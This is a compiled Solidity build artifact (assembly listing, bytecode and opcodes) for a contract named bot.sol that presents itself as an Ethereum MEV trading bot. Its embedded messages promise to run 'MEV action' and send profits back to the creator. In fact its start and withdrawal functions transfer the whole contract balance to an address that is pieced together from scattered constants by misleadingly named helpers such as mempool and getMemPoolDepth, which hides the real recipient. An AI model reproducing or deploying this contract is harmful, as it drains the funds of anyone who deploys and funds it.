/* \"contracts/bot.sol\":16914:16954  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16967:16990  string memory _tmpValue */\n      0x60\n        /* \"contracts/bot.sol\":17024:17035  _valueBytes */\n      dup2\n        /* \"contracts/bot.sol\":17024:17042  _valueBytes.length */\n      mload\n        /* \"contracts/bot.sol\":17004:17014  _baseBytes */\n      dup4\n        /* \"contracts/bot.sol\":17004:17021  _baseBytes.length */\n      mload\n        /* \"contracts/bot.sol\":17004:17042  _baseBytes.length + _valueBytes.length */\n      add\n        /* \"contracts/bot.sol\":16993:17043  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_118\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_118:\n        /* \"contracts/bot.sol\":16993:17043  new string(_baseBytes.length + _valueBytes.length) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_119\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"contracts/bot.sol\":16993:17043  new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n    tag_119:\n      pop\n        /* \"contracts/bot.sol\":16967:17043  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":17054:17076  bytes memory _newValue */\n      0x60\n        /* \"contracts/bot.sol\":17085:17094  _tmpValue */\n      dup2\n        /* \"contracts/bot.sol\":17054:17095  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":17108:17114  uint i */\n      0x00\n        /* \"contracts/bot.sol\":17125:17131  uint j */\n      dup1\n        /* \"contracts/bot.sol\":17150:17151  0 */\n      0x00\n        /* \"contracts/bot.sol\":17148:17151  i=0 */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":17144:17236  for(i=0; i<_baseBytes.length; i++) {\r... */\n    tag_120:\n        /* \"contracts/bot.sol\":17155:17165  _baseBytes */\n      dup6\n        /* \"contracts/bot.sol\":17155:17172  _baseBytes.length */\n      mload\n        /* \"contracts/bot.sol\":17153:17154  i */\n      dup3\n        /* \"contracts/bot.sol\":17153:17172  i<_baseBytes.length */\n      lt\n        /* \"contracts/bot.sol\":17144:17236  for(i=0; i<_baseBytes.length; i++) {\r... */\n      iszero\n      tag_121\n      jumpi\n        /* \"contracts/bot.sol\":17211:17221  _baseBytes */\n      dup6\n        /* \"contracts/bot.sol\":17222:17223  i */\n      dup3\n        /* \"contracts/bot.sol\":17211:17224  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_123\n      jumpi\n      invalid\n    tag_123:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":17194:17203  _newValue */\n      dup4\n        /* \"contracts/bot.sol\":17204:17207  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":17194:17208  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_124\n      jumpi\n      invalid\n    tag_124:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":17194:17224  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":17174:17177  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":17144:17236  for(i=0; i<_baseBytes.length; i++) {\r... */\n      jump(tag_120)\n    tag_121:\n        /* \"contracts/bot.sol\":17254:17255  0 */\n      0x00\n        /* \"contracts/bot.sol\":17252:17255  i=0 */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":17248:17342  for(i=0; i<_valueBytes.length; i++) {\r... */\n    tag_125:\n        /* \"contracts/bot.sol\":17259:17270  _valueBytes */\n      dup5\n        /* \"contracts/bot.sol\":17259:17277  _valueBytes.length */\n      mload\n        /* \"contracts/bot.sol\":17257:17258  i */\n      dup3\n        /* \"contracts/bot.sol\":17257:17277  i<_valueBytes.length */\n      lt\n        /* \"contracts/bot.sol\":17248:17342  for(i=0; i<_valueBytes.length; i++) {\r... */\n      iszero\n      tag_126\n      jumpi\n        /* \"contracts/bot.sol\":17316:17327  _valueBytes */\n      dup5\n        /* \"contracts/bot.sol\":17328:17329  i */\n      dup3\n        /* \"contracts/bot.sol\":17316:17330  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_128\n      jumpi\n      invalid\n    tag_128:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":17299:17308  _newValue */\n      dup4\n        /* \"contracts/bot.sol\":17309:17312  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":17299:17313  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_129\n      jumpi\n      invalid\n    tag_129:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":17299:17330  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":17279:17282  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":17248:17342  for(i=0; i<_valueBytes.length; i++) {\r... */\n      jump(tag_125)\n    tag_126:\n        /* \"contracts/bot.sol\":17368:17377  _newValue */\n      dup3\n        /* \"contracts/bot.sol\":17354:17378  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":16756:17386  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":12958:13046  function getMemPoolHeight() internal pure returns (uint) {\r... */\n    tag_60:\n        /* \"contracts/bot.sol\":13009:13013  uint */\n      0x00\n        /* \"contracts/bot.sol\":13033:13038  61546 */\n      0xf06a\n        /* \"contracts/bot.sol\":13026:13038  return 61546 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":12958:13046  function getMemPoolHeight() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16365:16453  function getMemPoolDepth() internal pure returns (uint) {\r... */\n    tag_62:\n        /* \"contracts/bot.sol\":16415:16419  uint */\n      0x00\n        /* \"contracts/bot.sol\":16439:16445  397214 */\n      0x060f9e\n        /* \"contracts/bot.sol\":16432:16445  return 397214 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16365:16453  function getMemPoolDepth() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":14590:14917  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_114:\n        /* \"contracts/bot.sol\":14642:14646  byte */\n      0x00\n        /* \"contracts/bot.sol\":14668:14669  d */\n      dup2\n        /* \"contracts/bot.sol\":14663:14669  0 <= d */\n      0xff\n      and\n        /* \"contracts/bot.sol\":14663:14664  0 */\n      0x00\n        /* \"contracts/bot.sol\":14663:14669  0 <= d */\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14663:14679  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_133\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":14678:14679  9 */\n      0x09\n        /* \"contracts/bot.sol\":14673:14674  d */\n      dup3\n        /* \"contracts/bot.sol\":14673:14679  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14663:14679  0 <= d && d <= 9 */\n    tag_133:\n        /* \"contracts/bot.sol\":14659:14850  if (0 <= d && d <= 9) {\r... */\n      iszero\n      tag_134\n      jumpi\n        /* \"contracts/bot.sol\":14727:14728  d */\n      dup2\n        /* \"contracts/bot.sol\":14714:14723  byte('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/bot.sol\":14708:14724  uint8(byte('0')) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":14708:14728  uint8(byte('0')) + d */\n      add\n        /* \"contracts/bot.sol\":14703:14729  byte(uint8(byte('0')) + d) */\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":14696:14729  return byte(uint8(byte('0')) + d) */\n      swap1\n      pop\n      jump(tag_132)\n        /* \"contracts/bot.sol\":14659:14850  if (0 <= d && d <= 9) {\r... */\n    tag_134:\n        /* \"contracts/bot.sol\":14763:14764  d */\n      dup2\n        /* \"contracts/bot.sol\":14751:14765  10 <= uint8(d) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":14751:14753  10 */\n      0x0a\n        /* \"contracts/bot.sol\":14751:14765  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14751:14783  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_136\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":14781:14783  15 */\n      0x0f\n        /* \"contracts/bot.sol\":14775:14776  d */\n      dup3\n        /* \"contracts/bot.sol\":14769:14783  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14751:14783  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_136:\n        /* \"contracts/bot.sol\":14747:14850  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n      iszero\n      tag_137\n      jumpi\n        /* \"contracts/bot.sol\":14835:14837  10 */\n      0x0a\n        /* \"contracts/bot.sol\":14831:14832  d */\n      dup3\n        /* \"contracts/bot.sol\":14818:14827  byte('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/bot.sol\":14812:14828  uint8(byte('a')) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":14812:14832  uint8(byte('a')) + d */\n      add\n        /* \"contracts/bot.sol\":14812:14837  uint8(byte('a')) + d - 10 */\n      sub\n        /* \"contracts/bot.sol\":14807:14838  byte(uint8(byte('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":14800:14838  return byte(uint8(byte('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_132)\n        /* \"contracts/bot.sol\":14747:14850  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n    tag_137:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":14590:14917  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_132:\n      swap2\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6 53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e\n    data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107 52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e\n\n    auxdata: 0xa2646970667358221220e6f32f1f0f104a358f1d37a9a86b740da37a7d83db8139b04a3d572eef9bdaf064736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50610c0a806100206000396000f3fe60806040526004361061004e5760003560e01c80636c02a9311461005a5780637b61c320146100ea578063ab1c067d1461017a578063be9a6555146101d1578063d4e93292146101db57610055565b3661005557005b600080fd5b34801561006657600080fd5b5061006f6101e5565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100af578082015181840152602081019050610094565b50505050905090810190601f1680156100dc5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100f657600080fd5b506100ff610283565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561013f578082015181840152602081019050610124565b50505050905090810190601f16801561016c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561018657600080fd5b5061018f610321565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101d9610338565b005b6101e36103d3565b005b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561027b5780601f106102505761010080835404028352916020019161027b565b820191906000526020600020905b81548152906001019060200180831161025e57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103195780601f106102ee57610100808354040283529160200191610319565b820191906000526020600020905b8154815290600101906020018083116102fc57829003601f168201915b505050505081565b600061033361032e61046e565b6105b7565b905090565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b9d6038913960400191505060405180910390a161038b610810565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103d0573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610b6a6033913960400191505060405180910390a1610426610827565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561046b573d6000803e3d6000fd5b50565b6060806104bf6040518060400160405280600181526020017f78000000000000000000000000000000000000000000000000000000000000008152506104ba6104b561083e565b61084a565b610950565b9050600064b00859c429905060006349edf9659050600062b71a32905060006104e6610aab565b905060006104f2610ab5565b90506060610508876105038861084a565b610950565b905060606105266105188761084a565b6105218761084a565b610950565b905060606105338561084a565b905060606105408561084a565b905060606105606105518686610950565b61055b8585610950565b610950565b905060606105a36040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525083610950565b9050809c5050505050505050505050505090565b6000606082905060008090506000806000600290505b602a81101561080357610100840293508481815181106105e957fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061060b57fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801561065c575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561066c57605783039250610706565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156106aa575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156106ba57603783039250610705565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106f8575060398373ffffffffffffffffffffffffffffffffffffffff1611155b15610704576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610744575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15610754576057820391506107ee565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610792575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156107a2576037820391506107ed565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156107e0575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107ec576030820391505b5b5b816010840201840193506002810190506105cd565b5082945050505050919050565b600061082261081d61046e565b6105b7565b905090565b600061083961083461046e565b6105b7565b905090565b60006304b716d2905090565b6060600080905060008390505b600081146108795781806001019250506010818161087157fe5b049050610857565b60608267ffffffffffffffff8111801561089257600080fd5b506040519080825280601f01601f1916602001820160405280156108c55781602001600182028036833780820191505090505b50905060008090505b8381101561094457601086816108e057fe5b0692506108ec83610ac0565b82600183870303815181106108fd57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053506010868161093657fe5b0495508060010190506108ce565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff8111801561097857600080fd5b506040519080825280601f01601f1916602001820160405280156109ab5781602001600182028036833780820191505090505b5090506060819050600080600091505b8551821015610a29578582815181106109d057fe5b602001015160f81c60f81b8382806001019350815181106109ed57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109bb565b600091505b8451821015610a9c57848281518110610a4357fe5b602001015160f81c60f81b838280600101935081518110610a6057fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610a2e565b82965050505050505092915050565b600061f06a905090565b600062060f9e905090565b60008160ff16600011158015610ada575060098260ff1611155b15610b0f57817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610b64565b8160ff16600a11158015610b275750600f8260ff1611155b15610b5f57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610b64565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea2646970667358221220e6f32f1f0f104a358f1d37a9a86b740da37a7d83db8139b04a3d572eef9bdaf064736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC0A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xEA JUMPI DUP1 PUSH4 0xAB1C067D EQ PUSH2 0x17A JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x1D1 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x1DB JUMPI PUSH2 0x55 JUMP JUMPDEST CALLDATASIZE PUSH2 0x55 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6F PUSH2 0x1E5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xAF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x94 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xDC JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xF6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xFF PUSH2 0x283 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x13F JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x124 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x16C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x186 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18F PUSH2 0x321 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1D9 PUSH2 0x338 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1E3 PUSH2 0x3D3 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x27B JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x250 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x27B JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x25E JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x319 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x319 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x2FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x333 PUSH2 0x32E PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB9D PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x38B PUSH2 0x810 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3D0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB6A PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x426 PUSH2 0x827 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x46B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x4BF PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x4BA PUSH2 0x4B5 PUSH2 0x83E JUMP JUMPDEST PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH5 0xB00859C429 SWAP1 POP PUSH1 0x0 PUSH4 0x49EDF965 SWAP1 POP PUSH1 0x0 PUSH3 0xB71A32 SWAP1 POP PUSH1 0x0 PUSH2 0x4E6 PUSH2 0xAAB JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4F2 PUSH2 0xAB5 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x508 DUP8 PUSH2 0x503 DUP9 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x526 PUSH2 0x518 DUP8 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x521 DUP8 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x533 DUP6 PUSH2 0x84A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x540 DUP6 PUSH2 0x84A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x560 PUSH2 0x551 DUP7 DUP7 PUSH2 0x950 JUMP JUMPDEST PUSH2 0x55B DUP6 DUP6 PUSH2 0x950 JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x5A3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x950 JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP 